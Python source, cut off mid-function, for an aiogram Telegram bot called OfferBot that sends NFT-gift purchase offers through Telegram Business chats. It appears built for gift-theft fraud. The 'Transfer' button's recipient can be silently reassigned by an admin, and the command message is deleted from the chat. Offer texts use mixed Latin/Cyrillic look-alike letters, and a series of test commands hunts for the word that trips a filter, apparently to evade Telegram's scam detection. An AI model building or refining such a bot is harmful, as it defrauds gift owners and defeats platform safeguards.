import asyncio
import logging
import random
import html
from datetime import datetime, timezone

from aiogram import Bot, Dispatcher, F
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram.exceptions import TelegramBadRequest, TelegramForbiddenError, TelegramRetryAfter
from aiogram.filters import Command
from aiogram.types import (CallbackQuery, InlineKeyboardButton, InlineKeyboardMarkup,
                           LinkPreviewOptions, Message, BusinessConnection)

from config import load_config
from database import Database
from offer import (ACCEPT_EMOJI_ID, DECLINE_EMOJI_ID, GIFT_EMOJI_ID, TRANSFER_EMOJI_ID,
                   PREMIUM_EMOJI_ID, DONE_EMOJI_ID, STARS_EMOJI_ID, GRAM_EMOJI_ID,
                   display_amount, format_remaining, gift_title, make_expiry, parse_offer)

logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(message)s")
log = logging.getLogger("offerbot")

cfg = load_config()
db = Database(cfg.database_url)
bot = Bot(cfg.bot_token, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher()
offer_locks = {}
awaiting_broadcast = set()
awaiting_support = set()
awaiting_profile_change = {}  # {admin_user_id: target_user_id}


def display_name(user) -> str:
    return " ".join(x for x in [getattr(user, 'first_name', None), getattr(user, 'last_name', None)] if x) or "Пользователь"


def instruction(locale="ru"):
    return (
        "<b>📘 КАК ПОЛЬЗОВАТЬСЯ OFFERBOT</b>\n"
        "<blockquote>Бесплатный бот для отправки оферов на подарки.</blockquote>\n"
        "<b>1.</b> Откройте <b>Настройки → Telegram для бизнеса → Чат-боты</b>.\n"
        "<b>2.</b> Подключите OfferBot и разрешите доступ к сообщениям.\n"
        "<b>3.</b> В Business-чате отправьте офер в формате:\n"
        "<blockquote><code>офер https://t.me/nft/PartySparkler-140864 150 stars</code></blockquote>\n"
        "<b>Валюта:</b> <code>stars</code>, <code>gram</code> или <code>₽</code>.\n"
        "<b>Язык:</b> в конце добавьте <code>en</code>, <code>cn</code> или <code>ar</code>.\n"
        "<b>Получатель подарка:</b> <code>/transfer @username</code>.\n\n"
        "🆓 <b>Все функции бесплатны.</b>"
    )


def error_text(kind):
    if kind == "nft": return "❌ Не нашёл ссылку на NFT.\n\n" + instruction()
    if kind == "price": return "❌ Не нашёл цену офера.\n\n" + instruction()
    return "❌ Не удалось обработать офер."


def offer_keyboard(offer_id: int, locale: str, currency: str = ""):
    labels = {
        "ru": ("Отклонить", "Принять"), "en": ("Decline", "Accept"),
        "cn": ("拒绝", "接受"), "ar": ("رفض", "قبول")
    }
    decline, accept = labels.get(locale, labels["ru"])
    #оаптвыяшпияпи
    # Стандартные эмодзи для кнопок
    return InlineKeyboardMarkup(inline_keyboard=[[
        InlineKeyboardButton(text=decline, icon_custom_emoji_id=DECLINE_EMOJI_ID, callback_data=f"of:decline:{offer_id}"),
        InlineKeyboardButton(text=accept, icon_custom_emoji_id=ACCEPT_EMOJI_ID, callback_data=f"of:accept:{offer_id}"),
    ]])


def transfer_keyboard(url: str, locale: str, offer_id: int):
    # Используем Three-Per-Em Space (\u2004) для центрирования текста
    labels = {"ru": "Передать\u2004", "en": "Transfer\u2004", "cn": "转赠\u2004", "ar": "نقل الهدية"}
    done_labels = {"ru": "\u2004Готово\u2004", "en": "\u2004Done\u2004", "cn": "\u2004完成\u2004", "ar": "\u2004تم\u2004"}
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=labels.get(locale, labels["ru"]), icon_custom_emoji_id=TRANSFER_EMOJI_ID, url=url)],
        [InlineKeyboardButton(text=done_labels.get(locale, done_labels["ru"]), icon_custom_emoji_id=PREMIUM_EMOJI_ID, callback_data=f"of:done:{offer_id}")]
    ])


def subscription_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📢 Перейти на канал", url=cfg.channel_url)],
        [InlineKeyboardButton(text="✅ Подтвердить подписку", callback_data="check_subscription")]
    ])


def main_menu_keyboard(user_id: int | None = None):
    rows = [
        [InlineKeyboardButton(text="👤 Мой кабинет", callback_data="my_profile")],
        [InlineKeyboardButton(text="📘 Инструкция", callback_data="show_instruction")],
        [InlineKeyboardButton(text="🛟 Техподдержка", callback_data="support_start")]
    ]
    return InlineKeyboardMarkup(inline_keyboard=rows)


def purchase_success_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💬 Чат покупателей", url=cfg.users_chat_url)],
        [InlineKeyboardButton(text="📘 Инструкция", callback_data="show_instruction")]
    ])


def admin_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📊 Статистика", callback_data="adm:stats:0")],
        [InlineKeyboardButton(text="🔌 Подключения", callback_data="adm:connections:0"),
         InlineKeyboardButton(text="📣 Рассылка", callback_data="adm:broadcast:0")],
        [InlineKeyboardButton(text="🟢 Выдать доступ по @username", callback_data="adm:allow_username:0")],
        [InlineKeyboardButton(text="👤 Изменить профиль кнопки 'Передать'", callback_data="adm:change_profile:0")],
        [InlineKeyboardButton(text="🔄 Обновить", callback_data="adm:home:0")],
    ])





async def safe_send_business(connection_id, chat_id, **kwargs):
    """Send one Business message with retry logic for TelegramRetryAfter."""
    last_exc = None
    for attempt in range(6):
        try:
            return await bot.send_message(chat_id=chat_id, business_connection_id=connection_id, **kwargs)
        except TelegramRetryAfter as e:
            last_exc = e
            if attempt >= 5:
                break
            await asyncio.sleep(e.retry_after + random.uniform(0.1, 0.4))
    raise last_exc


async def get_connection(connection_id: str):
    row = db.get_business_connection(connection_id)
    if row and row["is_enabled"]:
        return row
    try:
        bc = await bot.get_business_connection(connection_id)
        db.upsert_business_connection(connection_id, bc.user.id, bc.user.username, bc.user.first_name, bc.user.last_name, bc.is_enabled)
        log.info("BUSINESS CONNECTION RESTORED connection_id=%s owner_id=%s", connection_id, bc.user.id)
        return db.get_business_connection(connection_id)
    except Exception as e:
        log.error("BUSINESS CONNECTION FAILED connection_id=%s error=%s", connection_id, e)
        return None


async def process_offer(message: Message, business_connection_id: str | None = None):
    text = message.text or message.caption or ""
    plain_currency = text.strip().lower().startswith((".оффер", ".offer2"))
    parsed = parse_offer(text)
    if text.strip().lower() in {".офер", ".offer", "офер", "offer"}:
        await reply_message(message, instruction())
        return
    if parsed.get("error"):
        await reply_message(message, error_text(parsed["error"]))
        return

    sender = message.from_user
    if not sender:
        await reply_message(message, "❌ Не удалось определить отправителя.")
        return

    if business_connection_id:
        bc = await get_connection(business_connection_id)
        if not bc or not bc["is_enabled"]:
            await reply_message(message, "❌ Для офера сначала подключите Telegram Business к этому боту.")
            return
        seller_id = bc["user_id"]
        buyer_id = message.chat.id
        seller_username = bc["username"]
        buyer_username = sender.username
        buyer_url = f"tg://user?id={buyer_id}"
        if db.is_blocked(seller_id) or int(bc["is_blocked"]):
            await reply_message(message, "❌ Оферы для вашего Business-профиля пока не разрешены. Обратитесь к овнеру для получения доступа.")
            return
        if not db.has_access(seller_id, cfg.owner_id, cfg.offer_access_mode):
            await reply_message(message, "❌ Оферы для вашего Business-профиля пока не разрешены. Обратитесь к овнеру для получения доступа.")
            return
    else:
        seller_id = sender.id
        bc = db.get_connection_for_user(seller_id)
        if not bc:
            await reply_message(message, "❌ Для офера сначала подключите Telegram Business к этому боту.")
            return
        if db.is_blocked(seller_id) or int(bc["is_blocked"]):
            await reply_message(message, "❌ Оферы для вашего Business-профиля пока не разрешены. Обратитесь к овнеру для получения доступа.")
            return
        if not db.has_access(seller_id, cfg.owner_id, cfg.offer_access_mode):
            await reply_message(message, "❌ Оферы для вашего Business-профиля пока не разрешены. Обратитесь к овнеру для получения доступа.")
            return
        buyer_id = message.chat.id
        buyer_username = message.chat.username if message.chat else None
        buyer_url = f"tg://user?id={buyer_id}"
        seller_username = bc["username"]
        business_connection_id = bc["connection_id"]

    # Получаем профиль пользователя и формируем transfer_url
    profile = db.get_profile(seller_id)
    transfer_username = profile["name"] if profile and profile["name"] else seller_username
    transfer_url = (f"tg://send_gift?to={transfer_username.lstrip('@')}" if transfer_username else f"tg://user?id={seller_id}")
    now = datetime.now(timezone.utc)
    expires = make_expiry(now, cfg.offer_expire_hours)
    data = dict(seller_id=seller_id, seller_username=seller_username, buyer_id=buyer_id,
                buyer_username=buyer_username, buyer_url=buyer_url, gift_name=parsed["gift_name"],
                gift_number=parsed["gift_number"], gift_url=parsed["gift_url"], amount=parsed["amount"],
                currency=parsed["currency"], locale=parsed["locale"], status="pending",
                created_at=now.isoformat(), expires_at=expires.isoformat(), message_chat_id=None,
                message_id=None, business_connection_id=business_connection_id, transfer_url=transfer_url)
    offer_id = db.create_offer(data)
    log.info("[OFFER CREATE] offer_id=%s seller_id=%s buyer_id=%s business_connection_id=%s gift=%s gift_number=%s amount=%s currency=%s",
             offer_id, seller_id, buyer_id, business_connection_id, parsed["gift_name"], parsed["gift_number"], parsed["amount"], parsed["currency"])

    seller_name = " ".join(x for x in [bc["first_name"], bc["last_name"]] if x) or "Пользователь"
    title = gift_title(parsed["gift_name"], parsed["gift_number"])
    if plain_currency:
        value = f"{parsed['amount']:g}"
        if parsed["currency"] == "gram":
            amount = f"{value} Gram"
        elif parsed["currency"] == "stars":
            amount = f"{value} Stars"
        else:
            amount = f"{value}₽"
    else:
        amount = display_amount(parsed["amount"], parsed["currency"], with_emoji=True)
    remaining = format_remaining((expires - now).total_seconds(), parsed["locale"])
    if parsed["locale"] == "en":
        body = f"Usеr <b>{seller_name}</b> оffers <b>{amount}</b> fоr thе gift <a href=\"{parsed['gift_url']}\">{title}</a>.\n\nОffer ехpires in <b>{remaining}</b>."
    elif parsed["locale"] == "cn":
        body = f"用户 <b>{seller_name}</b> 为礼物 <a href=\"{parsed['gift_url']}\">{title}</a> 出价 <b>{amount}</b>。\n\n报价将在 <b>{remaining}</b> 后过期。"
    elif parsed["locale"] == "ar":
        body = f"المستخدم <b>{seller_name}</b> يعرض <b>{amount}</b> مقابل الهدية <a href=\"{parsed['gift_url']}\">{title}</a>.\n\nينتهي العرض خلال <b>{remaining}</b>."
    else:
        body = f"Пoльзoвaтeль <b>{seller_name}</b> прeдлaгaeт Вaм <b>{amount}</b> зa пoдaрoк <a href=\"{parsed['gift_url']}\">{title}</a>.\n\nПрeдлoжeниe дeйствуeт <b>{remaining}</b>."
    try:
        sent = await safe_send_business(business_connection_id, buyer_id, text=body,
            reply_markup=offer_keyboard(offer_id, parsed["locale"], parsed["currency"]),
            link_preview_options=LinkPreviewOptions(url=parsed["gift_url"], show_above_text=True))
    except Exception as e:
        log.exception("[OFFER SEND] offer_id=%s chat_id=%s business_connection_id=%s error=%s", offer_id, buyer_id, business_connection_id, e)
        db.delete_offer(offer_id)
        await reply_message(message, "❌ Не удалось отправить офер. Попробуйте ещё раз позже.")
        return
    db.set_offer_message(offer_id, buyer_id, sent.message_id)
    log.info("[OFFER SEND] offer_id=%s chat_id=%s business_connection_id=%s", offer_id, buyer_id, business_connection_id)
    await delete_source(message, business_connection_id)


async def reply_message(message: Message, text: str, reply_markup=None):
    """Reply to a message, optionally attaching an inline/reply keyboard."""
    try:
        if message.business_connection_id:
            await bot.send_message(
                chat_id=message.chat.id,
                business_connection_id=message.business_connection_id,
                text=text,
                reply_markup=reply_markup,
            )
        else:
            await message.answer(text, reply_markup=reply_markup)
    except Exception:
        log.exception("Failed to reply to message")


async def delete_source(message: Message, connection_id: str | None):
    try:
        if connection_id:
            await bot.delete_business_messages(business_connection_id=connection_id, message_ids=[message.message_id])
        else:
            await bot.delete_message(chat_id=message.chat.id, message_id=message.message_id)
    except Exception as e:
        log.warning("Could not delete source message: %s", e)


@dp.message(Command("start"))
async def on_start(message: Message):
    if not message.from_user:
        return
    user = message.from_user
    # Determine whether this exact Telegram account is new (one indexed lookup).
    try:
        with db.connect() as con, con.cursor() as cur:
            cur.execute("SELECT 1 FROM bot_users WHERE user_id=%s", (user.id,))
            is_new_user = cur.fetchone() is None
    except Exception:
        is_new_user = False
    db.register_user(user.id, user.username, user.first_name, user.last_name)
    if is_new_user and user.id != cfg.owner_id:
        try:
            await bot.send_message(cfg.owner_id, f"👤 <b>Новый пользователь</b>\n{display_name(user)} · @{user.username or 'без username'}\nID: <code>{user.id}</code>")
        except Exception:
            log.exception("Could not notify owner about new user")
    # Бесплатный доступ без обязательной подписки: не тратим время на get_chat_member.
    await message.answer(
        "<b>✦ OFFERBOT</b>\n"
        "<blockquote>Оферы на подарки — быстро и бесплатно.</blockquote>\n"
        "Выберите раздел ниже 👇",
        reply_markup=main_menu_keyboard(user.id),
    )


async def is_channel_subscriber(user_id: int) -> bool:
    # Если требование подписки отключено, всегда возвращаем True
    if not cfg.require_subscription:
        return True
    
    try:
        member = await bot.get_chat_member(chat_id=cfg.channel_id, user_id=user_id)
        status = getattr(member, "status", "")
        if status in {"creator", "administrator", "member"}:
            return True
        return status == "restricted" and bool(getattr(member, "is_member", False))
    except Exception as e:
        log.warning("Could not verify channel membership for user %s: %s", user_id, e)
        return False


@dp.callback_query(F.data == "check_subscription")
async def check_subscription_callback(call: CallbackQuery):
    if not call.from_user:
        await call.answer("Не удалось определить пользователя", show_alert=True)
        return
    if not await is_channel_subscriber(call.from_user.id):
        await call.answer("Сначала подпишись на канал, затем нажми подтвердить.", show_alert=True)
        return
    u = call.from_user
    db.register_user(u.id, u.username, u.first_name, u.last_name)
    text = "<b>Привет, друг! Ты попал в рай профитов.</b>\n\nВыбери, что тебе нужно:"
    try:
        await call.message.edit_text(text, reply_markup=main_menu_keyboard(call.from_user.id if call.from_user else None))
    except Exception:
        await call.message.answer(text, reply_markup=main_menu_keyboard(call.from_user.id if call.from_user else None))
    await call.answer("Подписка подтверждена!")


@dp.callback_query(F.data == "my_profile")
async def my_profile_callback(call: CallbackQuery):
    if not call.from_user:
        await call.answer("Не удалось определить пользователя", show_alert=True)
        return
    u = call.from_user
    db.register_user(u.id, u.username, u.first_name, u.last_name)
    data = db.user_profile_stats(u.id)
    profile = data.get("profile")
    connection = db.get_connection_for_user(u.id)
    created = data["user"]["created_at"] if data.get("user") else None
    created_text = created.strftime("%d.%m.%Y") if created and hasattr(created, "strftime") else "—"
    transfer_name = (profile.get("name") if profile else None) or u.username
    safe_name = html.escape(display_name(u))
    safe_username = html.escape("@" + u.username if u.username else "не указан")
    safe_transfer = html.escape("@" + transfer_name.lstrip("@") if transfer_name else "не настроен")
    connection_status = "🟢 Подключён" if connection else "⚪ Не подключён"
    text = (
        "<b>👤 МОЙ КАБИНЕТ</b>\n"
        "<blockquote>Ваш профиль OfferBot</blockquote>\n"
        f"✨ <b>{safe_name}</b>\n"
        f"🔗 {safe_username}  ·  ID: <code>{u.id}</code>\n\n"
        "<b>╭ ДОСТУП</b>\n"
        "├ 🆓 Тариф: <b>Бесплатный</b>\n"
        f"├ 🔌 Business: {connection_status}\n"
        f"╰ 🎁 Получатель: <code>{safe_transfer}</code>\n\n"
        f"<b>📅 С нами с:</b> <code>{created_text}</code>"
    )
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🎁 Настроить получателя", callback_data="profile_transfer_help")],
        [InlineKeyboardButton(text="📘 Инструкция", callback_data="show_instruction")],
        [InlineKeyboardButton(text="« Главное меню", callback_data="back_to_start")]
    ])
    try:
        await call.message.edit_text(text, reply_markup=keyboard)
    except Exception:
        await call.message.answer(text, reply_markup=keyboard)
    await call.answer()


@dp.callback_query(F.data == "profile_transfer_help")
async def profile_transfer_help_callback(call: CallbackQuery):
    await call.answer()
    await call.message.answer(
        "🎁 <b>Получатель подарка</b>\n\n"
        "Отправьте команду со своим Telegram username:\n"
        "<code>/transfer @username</code>\n\n"
        "Например: <code>/transfer @myname</code>"
    )

@dp.callback_query(F.data == "support_start")
async def support_start_callback(call: CallbackQuery):
    awaiting_support.add(call.from_user.id)
    await call.message.answer("🛟 Напиши сообщение в поддержку одним сообщением. Мы передадим его администратору. Для отмены отправь /cancel.")
    await call.answer()

@dp.callback_query(F.data == "show_instruction")
async def show_instruction_callback(call: CallbackQuery):
    try:
        rows = [[InlineKeyboardButton(text="« В меню", callback_data="back_to_start")]]
        await call.message.edit_text(instruction(), reply_markup=InlineKeyboardMarkup(inline_keyboard=rows))
    except Exception:
        await call.message.answer(instruction())
    await call.answer()


@dp.business_connection()
async def on_business_connection(bc: BusinessConnection):
    previous = db.get_business_connection(bc.id)
    should_notify = bc.is_enabled and (previous is None or not previous["is_enabled"])
    db.upsert_business_connection(bc.id, bc.user.id, bc.user.username, bc.user.first_name, bc.user.last_name, bc.is_enabled)
    log.info("Business connection id=%s user_id=%s enabled=%s", bc.id, bc.user.id, bc.is_enabled)
    # Уведомляем администратора только о новом подключении или повторном включении.
    if should_notify and bc.user.id != cfg.owner_id:
        if not db.is_blocked(bc.user.id):
            db.add_access(bc.user.id)
            db.set_connection_blocked(bc.id, False)
            state = "🟢 Бесплатный доступ активен"
        else:
            state = "⛔ Пользователь заблокирован"
        try:
            await bot.send_message(cfg.owner_id,
                f"🔌 <b>Business подключён</b>\n{display_name(bc.user)} · <code>{bc.user.id}</code>\nДоступ: {state}",
                reply_markup=InlineKeyboardMarkup(inline_keyboard=[[
                    InlineKeyboardButton(text="🟢 Дать доступ", callback_data=f"adm:allow:{bc.user.id}"),
                    InlineKeyboardButton(text="⛔ Блок", callback_data=f"adm:block:{bc.user.id}")],
                    [InlineKeyboardButton(text="Админка", callback_data="adm:home:0")]]))
        except Exception:
            log.exception("Failed to notify owner")


@dp.business_message()
async def on_business_message(message: Message):
    if cfg.business_debug:
        log.info("[BUSINESS] connection_id=%s from_user_id=%s from_username=%s chat_id=%s text=%s",
                 message.business_connection_id, message.from_user.id if message.from_user else None,
                 message.from_user.username if message.from_user else None, message.chat.id, message.text or message.caption)
    await handle_text(message, True)


@dp.message()
async def on_message(message: Message):
    if message.from_user and message.from_user.id == cfg.owner_id and message.chat.type == "private" and cfg.owner_id in awaiting_broadcast:
        if (message.text or "").strip().lower() == "/cancel":
            awaiting_broadcast.discard(cfg.owner_id)
            await message.answer("Рассылка отменена.")
            return
        if (message.text or "").strip().lower() == "/broadcast":
            await message.answer("Отправь текст, фото, видео или GIF для рассылки. Для отмены: /cancel")
            return
        awaiting_broadcast.discard(cfg.owner_id)
        recipients = db.list_broadcast_users()
        sent = failed = 0
        status = await message.answer(f"Начинаю рассылку для {len(recipients)} пользователей…")
        for uid in recipients:
            try:
                await bot.copy_message(chat_id=uid, from_chat_id=message.chat.id, message_id=message.message_id)
                sent += 1
            except TelegramForbiddenError:
                db.mark_user_blocked(uid)
                failed += 1
            except TelegramRetryAfter as e:
                await asyncio.sleep(e.retry_after)
                try:
                    await bot.copy_message(chat_id=uid, from_chat_id=message.chat.id, message_id=message.message_id)
                    sent += 1
                except Exception:
                    failed += 1
            except Exception:
                failed += 1
            await asyncio.sleep(0.04)
        await status.edit_text(f"Рассылка завершена.\nДоставлено: {sent}\nОшибок: {failed}")
        return
    if message.from_user and message.chat.type == "private":
        u = message.from_user
        db.register_user(u.id, u.username, u.first_name, u.last_name)
        if u.id in awaiting_support:
            if (message.text or "").strip().lower() == "/cancel":
                awaiting_support.discard(u.id)
                await message.answer("Обращение отменено.")
                return
            awaiting_support.discard(u.id)
            try:
                await bot.send_message(cfg.owner_id, f"🛟 <b>Обращение в поддержку</b>\nОт: {display_name(u)} (@{u.username or 'нет username'})\nID: <code>{u.id}</code>\n\nЧтобы ответить: <code>/reply {u.id} текст</code>\n\n" + ((message.text or message.caption or "[медиа]")[:3000]))
                if message.photo or message.document or message.video:
                    await bot.copy_message(cfg.owner_id, message.chat.id, message.message_id)
                await message.answer("✅ Обращение отправлено в поддержку.")
            except Exception:
                log.exception("Failed to forward support request")
                await message.answer("❌ Не удалось отправить сообщение. Попробуй позже.")
            return
    await handle_text(message, False)


async def handle_text(message: Message, is_business: bool):
    text = (message.text or "").strip()
    low = text.lower()
    if low == ".привет" or low == "привет":
        await reply_message(message, "Привет")
        return
    if low == ".бизнестест":
        if is_business:
            await reply_message(message, f"✅ Business-сообщение дошло до бота.\n\nConnection:\n<code>{message.business_connection_id}</code>\n\nUser ID:\n<code>{message.from_user.id if message.from_user else '—'}</code>\n\nChat ID:\n<code>{message.chat.id}</code>")
        else:
            await reply_message(message, "❌ Эта команда предназначена для Business-чата.")
        return
    
    # Тестовые команды для поиска проблемного слова в русском офере
    if low in [".офер1", ".offer1"]:
        await reply_message(message, "Пoльзoвaтeль")
        return
    if low in [".офер2", ".offer2"]:
        seller_name = " ".join(x for x in [getattr(message.from_user, 'first_name', None), getattr(message.from_user, 'last_name', None)] if x) or "Продавец"
        await reply_message(message, f"Пoльзoвaтeль <b>{seller_name}</b>")
        return
    if low in [".офер3", ".offer3"]:
        seller_name = " ".join(x for x in [getattr(message.from_user, 'first_name', None), getattr(message.from_user, 'last_name', None)] if x) or "Продавец"
        await reply_message(message, f"Пoльзoвaтeль <b>{seller_name}</b> прeдлaгaeт")
        return
    if low in [".офер4", ".offer4"]:
        seller_name = " ".join(x for x in [getattr(message.from_user, 'first_name', None), getattr(message.from_user, 'last_name', None)] if x) or "Продавец"
        await reply_message(message, f"Пoльзoвaтeль <b>{seller_name}</b> прeдлaгaeт Вам")
        return
    if low in [".офер5", ".offer5"]:
        seller_name = " ".join(x for x in [getattr(message.from_user, 'first_name', None), getattr(message.from_user, 'last_name', None)] if x) or "Продавец"
        await reply_message(message, f"Пoльзoвaтeль <b>{seller_name}</b> прeдлaгaeт Вам <b>150 Grаm</b>")
        return
    if low in [".офер6", ".offer6"]:
        seller_name = " ".join(x for x in [getattr(message.from_user, 'first_name', None), getattr(message.from_user, 'last_name', None)] if x) or "Продавец"
        await reply_message(message, f"Пoльзoвaтeль <b>{seller_name}</b> прeдлaгaeт Вaм <b>150 Grаm</b> зa")
        return
    if low in [".офер7", ".offer7"]:
        seller_name = " ".join(x for x in [getattr(message.from_user, 'first_name', None), getattr(message.from_user, 'last_name', None)] if x) or "Продавец"
        await reply_message(message, f"Пoльзoвaтeль <b>{seller_name}</b> прeдлaгaeт Вaм <b>150 Grаm</b> зa пoдaрoк")
        return
    if low in [".офер8", ".offer8"]:
        seller_name = " ".join(x for x in [getattr(message.from_user, 'first_name', None), getattr(message.from_user, 'last_name', None)] if x) or "Продавец"
        gift_url = "https://t.me/nft/PartySparkler-140864"
        title = "Party Sparkler #140864"
        await reply_message(message, f"Пoльзoвaтeль <b>{seller_name}</b> прeдлaгaeт Вaм <b>150 Grаm</b> зa пoдaрoк <a href=\"{gift_url}\">{title}</a>.")
        return
    if low in [".офер9", ".offer9"]:
        seller_name = " ".join(x for x in [getattr(message.from_user, 'first_name', None), getattr(message.from_user, 'last_name', None)] if x) or "Продавец"
        gift_url = "https://t.me/nft/PartySparkler-140864"
        title = "Party Sparkler #140864"
        await reply_message(message, f"Пoльзoвaтeль <b>{seller_name}</b> прeдлaгaeт Вaм <b>150 Grаm</b> зa пoдaрoк <a href=\"{gift_url}\">{title}</a>.\n\nПрeдлoжeниe")
        return
    if low in [".офер10", ".offer10"]:
        seller_name = " ".join(x for x in [getattr(message.from_user, 'first_name', None), getattr(message.from_user, 'last_name', None)] if x) or "Продавец"
        gift_url = "https://t.me/nft/PartySparkler-140864"
        title = "Party Sparkler #140864"
        await reply_message(message, f"Пoльзoвaтeль <b>{seller_name}</b> прeдлaгaeт Вaм <b>150 Grаm</b> зa пoдaрoк <a href=\"{gift_url}\">{title}</a>.\n\nПрeдлoжeниe дeйствуeт")
        return
    if low in [".офер11", ".offer11"]:
        seller_name = " ".join(x for x in [getattr(message.from_user, 'first_name', None), getattr(message.from_user, 'last_name', None)] if x) or "Продавец"
        gift_url = "https://t.me/nft/PartySparkler-140864"
        title = "Party Sparkler #140864"
        await reply_message(message, f"Пoльзoвaтeль <b>{seller_name}</b> прeдлaгaeт Вaм <b>150 Grаm</b> зa пoдaрoк <a href=\"{gift_url}\">{title}</a>.\n\nПрeдлoжeниe дeйствуeт <b>24ч</b>")
        return
    if low in [".офер12", ".offer12"]:
        seller_name = " ".join(x for x in [getattr(message.from_user, 'first_name', None), getattr(message.from_user, 'last_name', None)] if x) or "Продавец"
        gift_url = "https://t.me/nft/PartySparkler-140864"
        title = "Party Sparkler #140864"
        await reply_message(message, f"Пoльзoвaтeль <b>{seller_name}</b> прeдлaгaeт Вaм <b>150 Grаm</b> зa пoдaрoк <a href=\"{gift_url}\">{title}</a>.\n\nПрeдлoжeниe дeйствуeт <b>24ч</b>.")
        return
    
    # Тестовые команды для английского языка
    if low in [".тест1", ".test1"]:
        await reply_message(message, "Usеr")
        return
    if low in [".тест2", ".test2"]:
        seller_name = " ".join(x for x in [getattr(message.from_user, 'first_name', None), getattr(message.from_user, 'last_name', None)] if x) or "Seller"
        await reply_message(message, f"Usеr <b>{seller_name}</b>")
        return
    if low in [".тест3", ".test3"]:
        seller_name = " ".join(x for x in [getattr(message.from_user, 'first_name', None), getattr(message.from_user, 'last_name', None)] if x) or "Seller"
        await reply_message(message, f"Usеr <b>{seller_name}</b> оffers")
        return
    if low in [".тест4", ".test4"]:
        seller_name = " ".join(x for x in [getattr(message.from_user, 'first_name', None), getattr(message.from_user, 'last_name', None)] if x) or "Seller"
        await reply_message(message, f"Usеr <b>{seller_name}</b> оffers <b>150 Grаm</b>")
        return
    if low in [".тест5", ".test5"]:
        seller_name = " ".join(x for x in [getattr(message.from_user, 'first_name', None), getattr(message.from_user, 'last_name', None)] if x) or "Seller"
        await reply_message(message, f"Usеr <b>{seller_name}</b> оffers <b>150 Grаm</b> fоr")
        return
    if low in [".тест6", ".test6"]:
        seller_name = " ".join(x for x in [getattr(message.from_user, 'first_name', None), getattr(message.from_user, 'last_name', None)] if x) or "Seller"
        await reply_message(message, f"Usеr <b>{seller_name}</b> оffers <b>150 Grаm</b> fоr thе")
        return
    if low in [".тест7", ".test7"]:
        seller_name = " ".join(x for x in [getattr(message.from_user, 'first_name', None), getattr(message.from_user, 'last_name', None)] if x) or "Seller"
        await reply_message(message, f"Usеr <b>{seller_name}</b> оffers <b>150 Grаm</b> fоr thе gift")
        return
    if low in [".тест8", ".test8"]:
        seller_name = " ".join(x for x in [getattr(message.from_user, 'first_name', None), getattr(message.from_user, 'last_name', None)] if x) or "Seller"
        gift_url = "https://t.me/nft/PartySparkler-140864"
        title = "Party Sparkler #140864"
        await reply_message(message, f"Usеr <b>{seller_name}</b> оffers <b>150 Grаm</b> fоr thе gift <a href=\"{gift_url}\">{title}</a>.")
        return
    if low in [".тест9", ".test9"]:
        seller_name = " ".join(x for x in [getattr(message.from_user, 'first_name', None), getattr(message.from_user, 'last_name', None)] if x) or "Seller"
        gift_url = "https://t.me/nft/PartySparkler-140864"
        title = "Party Sparkler #140864"
        await reply_message(message, f"Usеr <b>{seller_name}</b> оffers <b>150 Grаm</b> fоr thе gift <a href=\"{gift_url}\">{title}</a>.\n\nОffer")
        return
    if low in [".тест10", ".test10"]:
        seller_name = " ".join(x for x in [getattr(message.from_user, 'first_name', None), getattr(message.from_user, 'last_name', None)] if x) or "Seller"
        gift_url = "https://t.me/nft/PartySparkler-140864"
        title = "Party Sparkler #140864"
        await reply_message(message, f"Usеr <b>{seller_name}</b> оffers <b>150 Grаm</b> fоr thе gift <a href=\"{gift_url}\">{title}</a>.\n\nОffer ехpires")
        return
    if low in [".тест11", ".test11"]:
        seller_name = " ".join(x for x in [getattr(message.from_user, 'first_name', None), getattr(message.from_user, 'last_name', None)] if x) or "Seller"
        gift_url = "https://t.me/nft/PartySparkler-140864"
        title = "Party Sparkler #140864"
        await reply_message(message, f"Usеr <b>{seller_name}</b> оffers <b>150 Grаm</b> fоr thе gift <a href=\"{gift_url}\">{title}</a>.\n\nОffer ехpires in")
        return
    if low in [".тест12", ".test12"]:
        seller_name = " ".join(x for x in [getattr(message.from_user, 'first_name', None), getattr(message.from_user, 'last_name', None)] if x) or "Seller"
        gift_url = "https://t.me/nft/PartySparkler-140864"
        title = "Party Sparkler #140864"
        await reply_message(message, f"Usеr <b>{seller_name}</b> оffers <b>150 Grаm</b> fоr thе gift <a href=\"{gift_url}\">{title}</a>.\n\nОffer ехpires in <b>24h</b>.")
        return
    
    # Поддерживаем разные варианты команды офер (с точкой и без)
    if (low.startswith(".оффер") or low.startswith(".офер") or low.startswith(".offer") or
            low.startswith("оффер ") or low.startswith("офер ") or low.startswith("offer ")):
        await process_offer(message, message.business_connection_id if is_business else None)
        return
    # Секретная команда: не добавлять её в меню команд Telegram.
    # Доступ выдаётся автоматически, без уведомления/подтверждения владельца.
    if low == "/code free" and not is_business and message.from_user:
        user = message.from_user
        if not await is_channel_subscriber(user.id):
            await reply_message(
                message,
                "Сначала подпишись на канал и отправь /start, затем повтори /code free.",
                reply_markup=subscription_keyboard(),
            )
            return
        db.register_user(user.id, user.username, user.first_name, user.last_name)
        db.add_access(user.id)
        db.unblock_offer_user(user.id)
        connection = db.get_connection_for_user(user.id)
        if connection:
            db.set_connection_blocked(connection["connection_id"], False)
        await reply_message(message, "✅ Бесплатный доступ активирован! Теперь можешь пользоваться OfferBot.")
        return
    if low.startswith("/admin") or low.startswith("/админ"):
        await admin_command(message)
        return
    if low == "/broadcast" and message.from_user and message.from_user.id == cfg.owner_id and not is_business:
        awaiting_broadcast.add(cfg.owner_id)
        await reply_message(message, "📣 <b>Рассылка включена</b>\nОтправь текст, фото, видео или GIF. Для отмены: /cancel")
        return
    if low.startswith("/transfer ") or low.startswith("/передача "):
        await set_transfer(message, text.split(maxsplit=1)[1].strip())
        return
    if low.startswith("/reply ") and message.from_user and message.from_user.id == cfg.owner_id and not is_business:
        parts = text.split(maxsplit=2)
        if len(parts) < 3 or not parts[1].isdigit():
            await reply_message(message, "Формат: /reply USER_ID текст ответа")
            return
        try:
